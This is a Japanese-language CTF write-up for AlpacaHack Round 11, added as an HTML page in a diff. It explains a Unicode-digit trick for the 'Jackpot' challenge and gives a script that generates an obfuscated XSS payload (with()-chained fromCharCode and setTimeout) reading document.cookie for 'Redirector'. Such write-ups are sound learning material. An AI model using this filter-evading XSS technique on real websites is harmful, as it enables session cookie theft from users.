@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>AlpacaHackRound11 Writeup</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+</head>
+<body>
+	<header>
+	
+
+</header>
+
+	
+	<main>
+		<article>
+			<h1>AlpacaHackRound11 Writeup</h1>
+			<div>
+				<p>2025.05.17 (Sat) 12:00 - 18:00 JSTでAlpacaHackがやっていたらしい。が見逃した。<br>
+普通に15:00に起きて、それ以降部屋の掃除をしていた。終わった。</p>
+<p>問題は、Jackpot、Redirector、Tiny Note、AlpacaMarkの4つで、Jackpotは63 solvesとsolve数が多いので解きたい。<br>
+次にRedirectorが6 solvesと多いが、どう考えても63 solvesに比べると少ないのでわかっても分からなくてもこれだけ復習対象にすることにする。</p>
+<p>つまり、今回はJackpotとRedirectorに挑むということです。</p>
+<h2 id="jackpot">Jackpot</h2>
+<p>つい最近Unicode周りで遊んだことが功を奏して結構すぐわかった。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fuzzing</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> codepoint <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x10ffff</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> :
+</span></span><span style="display:flex;"><span>            value <span style="color:#f92672">=</span>chr(codepoint)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span>fullmatch(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\d+&#34;</span>, value):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> int(value) <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found: Unicode </span><span style="color:#e6db74">{</span>codepoint<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, Character: </span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p>このコードから出力されるCharacterをcandidatesパラメータに含めるだけ。</p>
+<p>一例として以下の文字列となる。</p>
+<pre tabindex="0"><code>７𝟟𝟩7𝟳𖩧𞅇᧗෭๗
+</code></pre><p>これらは<code>\d</code>に引っかかり (つまり、数字の7として認識)、int()を行うと全て数字の7となるため、全ての値が7の配列が出来上がるというわけ。</p>
+<h2 id="redirector">Redirector</h2>
+<p>これは普通に分からんかった。
+色々な人の解法を見ると、with()を使って難読化するっぽい。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;alert(document.cookie)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;with(String)with(String())&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">payload</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">template</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;with(concat(fromCharCode(&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">ord</span>(<span style="color:#66d9ef">char</span>)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)))&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">template</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;setTimeout(concat(String()))&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">template</span>)
+</span></span></code></pre></div><p>payloadにcookieを取得するペイロードを打ち込めばフラグが取得できる。</p>
+<p>withの難読化とsetTimeoutの第一引数がevalと同じような挙動をするというのは面白いなと思いました。
+(知らなかった。)</p>
+
+			</div>
+			
+			
+                        
+
+
+		</article>
+	</main>
+
+        <p>&copy; 2025 <a href="http://localhost:1313/">back</a></p>
+        
+
+        
+
+	<footer>
+
+
+        <div>
+            <time id="time"></time>
+        </div>
+        <script src="/js/time.js">
+        </script>
+</footer>
+
+</body>
+
+</html>
